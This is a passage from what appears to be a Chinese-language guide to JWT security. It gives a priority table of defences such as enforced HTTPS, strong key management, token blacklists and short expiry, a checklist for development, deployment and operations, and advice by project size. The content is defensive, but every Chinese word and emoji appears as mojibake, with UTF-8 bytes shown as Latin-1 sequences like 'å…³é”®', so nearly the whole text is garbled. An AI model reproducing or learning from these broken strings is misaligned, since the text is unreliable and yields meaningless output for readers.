### 9.2 å…³é”®é˜²æŠ¤æªæ–½ä¼˜å…ˆçº§


| ä¼˜å…ˆçº§ | **é˜²æŠ¤æªæ–½** | **å®æ–½éš¾åº¦** | **å®‰å…¨æ”¶ç›Š** | **å¿…è¦æ€§** |
|-------|-------------|-------------|-------------|-----------|
| `ğŸ”¥ æœ€é«˜` | `å¼ºåˆ¶HTTPS` | `ç®€å•` | `æé«˜` | `å¿…é¡»` |
| `ğŸ”¥ æœ€é«˜` | `æ•æ„Ÿæ•°æ®ä¸å…¥è½½è·` | `ç®€å•` | `æé«˜` | `å¿…é¡»` |
| `ğŸ”¥ æœ€é«˜` | `å¼ºå¯†é’¥ç®¡ç†` | `ä¸­ç­‰` | `æé«˜` | `å¿…é¡»` |
| `âš ï¸ é«˜` | `Tokené»‘åå•` | `ä¸­ç­‰` | `é«˜` | `å¼ºçƒˆæ¨è` |
| `âš ï¸ é«˜` | `çŸ­æœŸè¿‡æœŸ+åˆ·æ–°æœºåˆ¶` | `ä¸­ç­‰` | `é«˜` | `å¼ºçƒˆæ¨è` |
| `â„¹ï¸ ä¸­` | `è®¾å¤‡æŒ‡çº¹éªŒè¯` | `å¤æ‚` | `ä¸­ç­‰` | `å¯é€‰` |
| `â„¹ï¸ ä¸­` | `IPåœ°å€ç»‘å®š` | `å¤æ‚` | `ä¸­ç­‰` | `å¯é€‰` |

### 9.3 å®‰å…¨æ£€æŸ¥æ¸…å•


**å¼€å‘é˜¶æ®µ**ï¼š
- [ ] âœ… ä½¿ç”¨å¼ºéšæœºå¯†é’¥ï¼ˆè‡³å°‘256ä½ï¼‰
- [ ] âœ… å¯†é’¥é€šè¿‡ç¯å¢ƒå˜é‡ç®¡ç†
- [ ] âœ… JWTè½½è·ä¸åŒ…å«æ•æ„Ÿä¿¡æ¯
- [ ] âœ… è®¾ç½®åˆç†çš„è¿‡æœŸæ—¶é—´
- [ ] âœ… å®ç°åˆ·æ–°tokenæœºåˆ¶

**éƒ¨ç½²é˜¶æ®µ**ï¼š
- [ ] âœ… å¼ºåˆ¶HTTPSä¼ è¾“
- [ ] âœ… è®¾ç½®å®‰å…¨å“åº”å¤´
- [ ] âœ… å®ç°tokené»‘åå•åŠŸèƒ½
- [ ] âœ… é…ç½®æ—¥å¿—ç›‘æ§
- [ ] âœ… å®šæœŸå¯†é’¥è½®æ¢è®¡åˆ’

**è¿ç»´é˜¶æ®µ**ï¼š
- [ ] âœ… ç›‘æ§å¼‚å¸¸è®¿é—®æ¨¡å¼
- [ ] âœ… åŠæ—¶å¤„ç†å®‰å…¨å‘Šè­¦
- [ ] âœ… å®šæœŸå®‰å…¨å®¡è®¡
- [ ] âœ… ç”¨æˆ·å®‰å…¨æ•™è‚²

### 9.4 å®é™…åº”ç”¨æŒ‡å¯¼


**ä¼ä¸šçº§åº”ç”¨**ï¼š
- ğŸ¢ **é«˜å®‰å…¨è¦æ±‚**ï¼šå®æ–½æ‰€æœ‰é˜²æŠ¤æªæ–½
- ğŸ’¼ **åˆè§„éœ€æ±‚**ï¼šè¯¦ç»†çš„å®¡è®¡æ—¥å¿—
- ğŸ”’ **é›¶ä¿¡ä»»æ¶æ„**ï¼šæ¯æ¬¡è¯·æ±‚éƒ½éªŒè¯

**ä¸­å°å‹åº”ç”¨**ï¼š
- ğŸš€ **å¿«é€Ÿä¸Šçº¿**ï¼šä¸“æ³¨æ ¸å¿ƒé˜²æŠ¤ï¼ˆHTTPS + å¼ºå¯†é’¥ + çŸ­æœŸè¿‡æœŸï¼‰
- âš–ï¸ **å¹³è¡¡è€ƒè™‘**ï¼šæ ¹æ®é£é™©è¯„ä¼°é€‰æ‹©æªæ–½
- ğŸ“ˆ **é€æ­¥å®Œå–„**ï¼šéšä¸šåŠ¡å‘å±•å¢åŠ å®‰å…¨æªæ–½

**ä¸ªäººé¡¹ç›®**ï¼š
- ğŸ“ **å­¦ä¹ ç›®çš„**ï¼šç†è§£å®‰å…¨åŸç†æ¯”å®Œæ•´å®ç°æ›´é‡è¦
- ğŸ› ï¸ **å®è·µç»éªŒ**ï¼šä»åŸºç¡€é˜²æŠ¤å¼€å§‹é€æ­¥å­¦ä¹ 
- ğŸ¯ **é‡ç‚¹å…³æ³¨**ï¼šHTTPS + æ•æ„Ÿæ•°æ®ä¿æŠ¤

> ğŸ’¡ **æ ¸å¿ƒè®°å¿†**ï¼šJWTå®‰å…¨çš„æœ¬è´¨æ˜¯**ä¿¡ä»»é“¾ç®¡ç†** - ä¿æŠ¤å¯†é’¥å°±æ˜¯ä¿æŠ¤æ•´ä¸ªç³»ç»Ÿï¼Œä¿æŠ¤ä¼ è¾“å°±æ˜¯ä¿æŠ¤ç”¨æˆ·æ•°æ®ï¼Œåˆç†è®¾è®¡å°±æ˜¯å¹³è¡¡å®‰å…¨ä¸ä½“éªŒ